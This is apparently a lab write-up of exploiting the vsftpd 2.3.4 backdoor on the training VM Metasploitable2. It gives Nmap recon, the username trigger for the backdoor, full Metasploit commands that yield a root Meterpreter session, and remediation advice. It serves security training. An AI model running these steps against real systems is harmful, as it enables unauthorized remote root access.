# vsftpd 2.3.4 Backdoor Exploitation - Metasploitable2
## Summary
Performed a network scan against Metasploitable2, a deliberately vulnerable Linux VM, to identify running services and potential vulnerabilities. Identified an outdated FTP service (vsftpd 2.3.4) containing a known backdoor, exploited it using Metasploit, and achieved full root-level remote access.
## Recon
Ran an Nmap service scan against the target to enumerate open ports and running services:
```
nmap -sV 192.168.56.101
```
Key finding:
```
21/tcp open ftp vsftpd 2.3.4
```
Port 21 revealed vsftpd 2.3.4, a version publicly known to contain a maliciously inserted backdoor.
## Vulnerability Background
In 2011, the vsftpd 2.3.4 source code was compromised by an attacker and briefly distributed with a hidden backdoor. A specially crafted username containing ":)" triggers a listener on port 6200, granting unauthenticated shell access. The compromised version was quickly identified and removed from official distribution, but remains a common target in security training environments such as Metasploitable2.
## Exploitation
Used Metasploit to exploit the backdoor:
```
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.103
run
```
Result: Meterpreter session opened, confirming successful exploitation:
```
[+] 192.168.56.101:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] 192.168.56.101:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.56.103:4444 -> 192.168.56.101:47924)
```
Verified access level:

<img width="239" height="153" alt="Screenshot 2026-09-13 111306" src="https://github.com/user-attachments/assets/271381dd-3cf2-495e-b1ce-e8366b1628b6" />

## Remediation
This backdoored version should never be present in a production environment. Affected systems should immediately upgrade to an official, verified vsftpd release. Any host suspected of running unauthorized or tampered software should be isolated from the network and rebuilt from a trusted image. Additionally, unnecessary services (FTP, Telnet, etc.) should be disabled if not required for business function.
